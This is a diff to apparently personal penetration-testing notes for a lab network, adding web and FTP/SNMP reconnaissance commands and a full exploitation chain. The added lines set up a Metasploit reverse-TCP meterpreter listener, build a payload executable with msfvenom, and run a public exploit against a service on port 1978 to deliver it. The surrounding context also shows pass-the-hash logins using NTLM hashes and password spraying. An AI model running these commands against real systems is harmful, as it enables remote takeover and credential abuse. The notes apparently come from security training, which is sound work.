@@ -208,8 +208,19 @@ nmap -sT -A -Pn -p 80 192.168.225.145
 sudo nmap -sV -p 80 --script "vuln" 192.168.225.145
 gobuster dir -u http://192.168.225.145 -w /usr/share/wordlists/dirb/big.txt
 gobuster dir -u http://192.168.225.145 -w /usr/share/wordlists/dirb/common.txt
-unicornscan -mU -I 192.168.225.145:80 -v
+
 # port 1978 unisql is open
+nikto -h 192.168.225.145
+
+wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://192.168.225.145/FUZZ
+ffuf -c -e '.htm','.php','.html','.js','.txt','.zip','.bak','.asp','.aspx','xml','.log' -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://192.168.225.145/FUZZ
+gobuster dir -u http://192.168.225.145 -w /usr/share/wordlists/dirb/common.txt -x txt,pdf,config
+
+# anonymous mode on, can't do anything
+nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 192.168.225.145
+
+# port 161 snmp is open
+sudo nmap -sU 192.168.225.145
 
 # did not work
 crackmapexec smb 192.168.225.141 -u Administrator -p 'December31' --continue-on-success
@@ -220,6 +231,21 @@ crowbar -b rdp -s 192.168.225.145/32 -u Administrator -C passwords.txt -n 1
 impacket-psexec -hashes :e728ecbadfb02f51ce8eed753f3ff3fd celia.almeda@192.168.225.145
 impacket-psexec -hashes :9a3121977ee93af56ebd0ef4f527a35e mary.williams@192.168.225.145
 impacket-wmiexec -hashes :9a3121977ee93af56ebd0ef4f527a35e mary.williams@192.168.225.141
+
+# try 1978 unisql 
+# google for unisql exploit - find https://www.exploit-db.com/exploits/49601
+
+sudo msfconsole -q
+use multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.45.219
+set LPORT 4444
+set ExitOnSession false
+run -j
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.219 LPORT=4444 -f exe -o met.exe
+
+python3 49601.py 192.168.225.145 192.168.45.218 met.exe
 ```
 
 .142
